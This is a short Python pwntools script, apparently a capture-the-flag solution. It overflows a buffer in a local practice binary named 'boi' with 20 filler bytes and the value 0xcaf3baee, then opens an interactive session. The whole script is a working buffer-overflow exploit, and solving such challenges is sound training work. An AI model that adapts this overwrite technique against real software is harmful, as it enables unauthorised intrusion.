from pwn import *

payload = b"0"*0x14 + p32(0xcaf3baee)

with open ("input", "wb") as f:
    f.write(payload)
print(f"Written {payload} to file")

print("Running program:")
p = process('./boi')
p.recvuntil(b'boiiiii??')
p.sendline(payload)
p.interactive()
